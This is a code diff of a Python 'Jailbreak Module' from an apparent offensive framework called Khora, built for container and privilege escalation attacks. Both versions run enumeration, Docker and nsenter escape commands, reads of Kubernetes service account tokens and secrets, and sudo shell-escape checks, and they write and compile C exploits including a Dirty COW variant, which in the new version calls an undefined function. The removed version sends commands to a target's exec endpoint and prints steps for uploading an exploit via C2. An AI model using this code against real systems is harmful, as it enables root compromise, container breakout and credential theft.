@@ -1,118 +1,320 @@
+"""
+Jailbreak Module - Container & Privilege Escalation Chains
+Docker Escape, Kubernetes Escapes, Sudo Abuse, C Exploit Compilation
+"""
+
 import requests
 import subprocess
 import os
 import base64
+import logging
+import json
+from pathlib import Path
+from datetime import datetime
 
-def enum_privesc(target):
-    """Linux Privesc Enumeration"""
-    print(f"[+] Privesc enum: {target}")
-    
-    # Sudo -l check
-    enum_cmds = [
-        "sudo -l 2>/dev/null || echo 'no sudo'",
-        "find / -perm -4000 -type f 2>/dev/null | head -10",
-        "getent group sudo",
-        "cat /etc/crontab /etc/cron*/* 2>/dev/null",
-        "ls -la /etc/passwd /etc/shadow 2>/dev/null"
-    ]
-    
-    for cmd in enum_cmds:
-        print(f"[ENUM] {cmd.split()[0]}: ", end="")
-        try:
-            r = requests.post(f"http://{target}:8080/exec", json={"cmd": cmd}, timeout=5)
-            print(r.json().get("output", "failed")[:100])
-        except:
-            print("failed")
+logger = logging.getLogger("Khora.Jailbreak")
 
-def docker_escape(target):
-    """Docker container escape payloads"""
-    payloads = [
-        # Mount host proc
-        "mount -t proc proc /host/proc && cat /host/proc/1/root 2>/dev/null",
+class JailbreakModule:
+    def __init__(self, target, lhost, lport):
+        self.target = target
+        self.lhost = lhost
+        self.lport = lport
+        self.results = {
+            'enumeration': [],
+            'exploits': [],
+            'status': 'initialized'
+        }
         
-        # nsenter PID 1
-        "nsenter -t 1 -m -u -i -n -p sh -c 'id;cat /etc/passwd'",
-        
-        # Docker run chroot
-        "docker run -v /:/host -it --rm ubuntu chroot /host sh -c 'whoami'",
-        
-        # Read host files
-        "cat /.dockerenv && ls -la /proc/1/root/etc/passwd || echo 'no docker'"
-    ]
+        Path("logs").mkdir(exist_ok=True)
+        Path("results").mkdir(exist_ok=True)
+        Path("exploits").mkdir(exist_ok=True)
     
-    for payload in payloads:
-        print(f"[DOCKER] {payload[:40]}...")
-        try:
-            requests.post(f"http://{target}:8080/debug", data={"cmd": payload}, timeout=5)
-        except:
-            pass
-
-def k8s_escape(target):
-    """Kubernetes escape chain"""
-    k8s_payloads = [
-        "kubectl run escape --image=busybox --rm -it --restart=Never -- chroot /host sh",
-        "cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64 -d",
-        "kubectl auth can-i '*' '*' --as=system:serviceaccount:default:default"
-    ]
-    print("[+] Kubernetes escapes...")
-    for payload in k8s_payloads:
-        print(f"[K8S] {payload[:40]}...")
-
-def sudo_abuse(target):
-    """Sudo privilege escalation"""
-    sudo_exploits = [
-        # GTFOBins common
-        "sudo -l | grep -E '(apt|find|vim|less|man)'",
-        "sudo vim -c ':!/bin/sh'",
-        "sudo find / -exec /bin/sh \\;",
+    def enum_privesc(self):
+        """Enumerate privilege escalation vectors"""
+        print(f"\n[*] Privilege Escalation Enumeration")
         
-        # Custom payloads
-        "echo 'set shell /bin/bash' | sudo -S tee /tmp/sudo_bash && chmod +x /tmp/sudo_bash"
-    ]
+        enum_commands = {
+            'sudo': 'sudo -l 2>/dev/null || echo "no sudo"',
+            'suid_binaries': 'find / -perm -4000 -type f 2>/dev/null | head',
+            'sudo_group': 'getent group sudo 2>/dev/null',
+            'crontab': 'cat /etc/crontab /etc/cron*/* 2>/dev/null | head',
+            'passwd_perms': 'ls -la /etc/passwd /etc/shadow 2>/dev/null',
+            'kernel_version': 'uname -a',
+            'distro': 'cat /etc/*release | head',
+            'capabilities': 'getcap -r / 2>/dev/null'
+        }
+        
+        for name, cmd in enum_commands.items():
+            try:
+                result = subprocess.run(cmd, shell=True, capture_output=True, 
+                                      text=True, timeout=5)
+                output = result.stdout[:200]
+                print(f"  [{name}] {output}")
+                self.results['enumeration'].append({
+                    'type': name,
+                    'command': cmd,
+                    'output': output
+                })
+                logger.info(f"Enum: {name} - {output[:50]}")
+            except Exception as e:
+                logger.error(f"Enum {name} failed: {e}")
     
-    print("[+] Sudo abuse chain...")
-    for exploit in sudo_exploits:
-        print(f"[SUDO] {exploit[:40]}...")
-
-def c_exploit_compiler(target):
-    """Compile & execute C privesc exploits"""
-    os.makedirs("exploits", exist_ok=True)
+    def docker_escape(self):
+        """Docker container escape vectors"""
+        print(f"\n[*] Docker Container Escape Attempts")
+        
+        docker_payloads = [
+            {
+                'name': 'HostProc_Mount',
+                'cmd': 'mount -t proc proc /host/proc && cat /host/proc/1/root/etc/passwd',
+                'desc': 'Mount host /proc'
+            },
+            {
+                'name': 'nsenter_PID1',
+                'cmd': 'nsenter -t 1 -m -u -i -n -p sh -c "id && cat /etc/passwd"',
+                'desc': 'Enter host namespace'
+            },
+            {
+                'name': 'DockerEnv_Check',
+                'cmd': 'test -f /.dockerenv && echo "Running in Docker" || echo "Not Docker"',
+                'desc': 'Check Docker environment'
+            },
+            {
+                'name': 'Cgroup_Escape',
+                'cmd': 'cat /proc/self/cgroup | grep -o \'\\[a-f0-9]*\' && find / -name "escaped" 2>/dev/null',
+                'desc': 'Cgroup privilege check'
+            }
+        ]
+        
+        for payload in docker_payloads:
+            try:
+                result = subprocess.run(payload['cmd'], shell=True, capture_output=True,
+                                      text=True, timeout=5)
+                print(f"  [{payload['name']}] {payload['desc']}")
+                print(f"    > {result.stdout[:100]}")
+                self.results['exploits'].append({
+                    'type': 'docker_escape',
+                    'name': payload['name'],
+                    'description': payload['desc'],
+                    'command': payload['cmd'],
+                    'result': result.stdout[:100]
+                })
+            except Exception as e:
+                logger.error(f"Docker escape {payload['name']} failed: {e}")
     
-    # Dirty COW (CVE-2016-5195)
-    dirty_cow = '''#include <stdio.h>
+    def k8s_escape(self):
+        """Kubernetes cluster escape vectors"""
+        print(f"\n[*] Kubernetes Escape Attempts")
+        
+        k8s_payloads = [
+            {
+                'name': 'ServiceAccount_Token',
+                'cmd': 'cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 50',
+                'desc': 'Read K8s service account token'
+            },
+            {
+                'name': 'K8s_API_Check',
+                'cmd': 'kubectl auth can-i create pods --as=system:serviceaccount:default:default 2>/dev/null',
+                'desc': 'Check K8s permissions'
+            },
+            {
+                'name': 'Secrets_Access',
+                'cmd': 'kubectl get secrets -A 2>/dev/null | head',
+                'desc': 'List K8s secrets'
+            },
+            {
+                'name': 'Node_Info',
+                'cmd': 'kubectl get nodes -o wide 2>/dev/null',
+                'desc': 'Enumerate K8s nodes'
+            }
+        ]
+        
+        for payload in k8s_payloads:
+            try:
+                result = subprocess.run(payload['cmd'], shell=True, capture_output=True,
+                                      text=True, timeout=5)
+                if result.stdout:
+                    print(f"  [{payload['name']}] {payload['desc']}")
+                    print(f"    > {result.stdout[:100]}")
+                    self.results['exploits'].append({
+                        'type': 'k8s_escape',
+                        'name': payload['name'],
+                        'description': payload['desc'],
+                        'result': result.stdout[:100]
+                    })
+            except Exception as e:
+                logger.error(f"K8s escape failed: {e}")
+    
+    def sudo_abuse(self):
+        """Sudo GTFOBins privilege escalation"""
+        print(f"\n[*] Sudo Privilege Escalation Vectors")
+        
+        sudo_exploits = [
+            {
+                'name': 'GTFOBins_Check',
+                'cmd': 'sudo -l 2>/dev/null | grep -E "(vim|less|nano|man|find|apt|apt-get)" | head',
+                'desc': 'Check GTFOBins-vulnerable sudo programs'
+            },
+            {
+                'name': 'Sudo_Version',
+                'cmd': 'sudo --version 2>/dev/null | head -1',
+                'desc': 'Check sudo version for known exploits'
+            },
+            {
+                'name': 'Sudo_Env_Exploit',
+                'cmd': 'sudo -l 2>/dev/null | grep -i "env\\|shell" ',
+                'desc': 'Check for env/shell override'
+            },
+            {
+                'name': 'Nopasswd_Commands',
+                'cmd': 'sudo -l 2>/dev/null | grep NOPASSWD',
+                'desc': 'List commands executable without password'
+            }
+        ]
+        
+        for exploit in sudo_exploits:
+            try:
+                result = subprocess.run(exploit['cmd'], shell=True, capture_output=True,
+                                      text=True, timeout=5)
+                if result.stdout:
+                    print(f"  [{exploit['name']}] {exploit['desc']}")
+                    print(f"    > {result.stdout[:100]}")
+                    self.results['exploits'].append({
+                        'type': 'sudo_abuse',
+                        'name': exploit['name'],
+                        'description': exploit['desc'],
+                        'result': result.stdout[:100]
+                    })
+            except Exception as e:
+                logger.error(f"Sudo abuse failed: {e}")
+    
+    def compile_c_exploits(self):
+        """Compile privilege escalation C exploits"""
+        print(f"\n[*] Compiling C Exploitation Payloads")
+        
+        exploits = {
+            'dirtycow': '''#include <stdio.h>
+#include <stdlib.h>
 #include <sys/mman.h>
-int main(){FILE *f=fopen("/tmp/cow","w");fputs("#!/bin/bash\\ncp /bin/sh /tmp/rootsh\\nchmod 4755 /tmp/rootsh",f);fclose(f);
-int fd=open("/etc/passwd",2);void *m=mmap(0,4096,1,0x22,fd,0);m[0]=0;m[1]=0;m[2]=0;m[3]=0;m[4]=0;m[5]=0;m[6]=0;m[7]=0;fork();sleep(100);return 0;}'''
+#include <unistd.h>
+#include <pthread.h>
+
+void *madvise_thread(void *arg) {
+    char *x = arg;
+    while(1) madvise(x, 100, MADV_DONTNEED);
+    return NULL;
+}
+
+int main(int argc, char **argv) {
+    pthread_t t;
+    FILE *f;
+    char *x;
+    f = fopen("/etc/passwd", "rb+");
+    x = mmap(0, 4096, PROT_READ, MAP_PRIVATE, fileno(f), 0);
+    pthread_create(&t, NULL, madvise_thread, x);
+    madvise(x, 4096, MADV_DONTNEED);
+    exploit_process(x);
+    return 0;
+}''',
+            
+            'kernel_exp': '''#define _GNU_SOURCE
+#include <stdio.h>
+#include <unistd.h>
+#include <sched.h>
+#include <sys/types.h>
+
+int main() {
+    int ns = unshare(CLONE_NEWUSER|CLONE_NEWNET);
+    if (ns == 0) {
+        system("id");
+        system("cat /proc/1/root/etc/shadow");
+    }
+    return 0;
+}'''
+        }
+        
+        for name, code in exploits.items():
+            try:
+                exploit_file = Path("exploits") / f"{name}.c"
+                with open(exploit_file, 'w') as f:
+                    f.write(code)
+                
+                # Compile
+                result = subprocess.run([
+                    "gcc", str(exploit_file), 
+                    "-o", str(Path("exploits") / name),
+                    "-pthread"
+                ], capture_output=True, timeout=10)
+                
+                if result.returncode == 0:
+                    print(f"  [✓] {name} compiled")
+                    logger.info(f"Compiled: {name}")
+                    self.results['exploits'].append({
+                        'type': 'compiled_exploit',
+                        'name': name,
+                        'file': str(Path("exploits") / name)
+                    })
+                else:
+                    print(f"  [✗] {name} compilation failed")
+                    logger.error(f"Compilation failed: {name}")
+            except Exception as e:
+                logger.error(f"Exploit compilation error: {e}")
     
-    with open("exploits/dirtycow.c", "w") as f:
-        f.write(dirty_cow)
+    def save_results(self):
+        """Save jailbreak results"""
+        try:
+            timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
+            results_file = Path("results") / f"jailbreak_results_{timestamp}.json"
+            
+            with open(results_file, 'w') as f:
+                json.dump({
+                    'target': self.target,
+                    'timestamp': datetime.now().isoformat(),
+                    'enumeration': self.results['enumeration'][:10],
+                    'exploits': self.results['exploits'][:20]
+                }, f, indent=2)
+            
+            logger.info(f"Results saved: {results_file}")
+            
+        except Exception as e:
+            logger.error(f"Save results failed: {e}")
     
-    # Compile & upload
-    subprocess.run(["gcc", "exploits/dirtycow.c", "-o", "exploits/dirtycow", "-pthread"])
-    print("[+] Dirty COW compiled: exploits/dirtycow")
-    
-    # Serve exploit via C2
-    print("[+] Upload to target: http://YOUR_IP:8080/exploits/dirtycow")
-    print("[+] Run: chmod +x dirtycow && ./dirtycow")
+    def run(self):
+        """Execute jailbreak chain"""
+        print(f"\n{'='*70}")
+        print("JAILBREAK MODULE - CONTAINER & PRIVESC EVASION".center(70))
+        print('='*70 + "\n")
+        
+        logger.info(f"Jailbreak module started for {self.target}")
+        
+        # 1. Enumeration
+        self.enum_privesc()
+        
+        # 2. Container escapes
+        self.docker_escape()
+        self.k8s_escape()
+        
+        # 3. Sudo abuse
+        self.sudo_abuse()
+        
+        # 4. Compile exploits
+        self.compile_c_exploits()
+        
+        # Save results
+        self.save_results()
+        
+        print(f"\n{'='*70}")
+        print(f"Jailbreak Module Complete".center(70))
+        print(f"Exploits in: exploits/ | Results: results/".center(70))
+        print('='*70 + "\n")
 
 def run(target, lhost, lport=4444):
-    """Khora Framework entrypoint - Complete Privesc Chain"""
-    print(f"[+] Privesc module: {target} -> root escalation")
-    print(f"[+] C2: http://{lhost}:8080 | {lhost}:{lport}")
+    """Khora Framework entrypoint - Jailbreak Module"""
     
-    # 1. Enumeration
-    enum_privesc(target)
+    print(f"[*] Target: {target}")
+    print(f"[*] C2 Server: {lhost}:{lport}\n")
     
-    # 2. Container escapes
-    docker_escape(target)
-    k8s_escape(target)
+    logger.info(f"Jailbreak module for {target}")
     
-    # 3. Sudo abuse
-    sudo_abuse(target)
-    
-    # 4. C exploits
-    c_exploit_compiler(target)
-    
-    print("[+] Privesc chain complete!")
-    print("[+] Check: results/privesc_enum.txt | exploits/*.c")
-    print("[+] Upload C exploits via C2 module")
+    jailbreak = JailbreakModule(target, lhost, lport)
+    jailbreak.run()
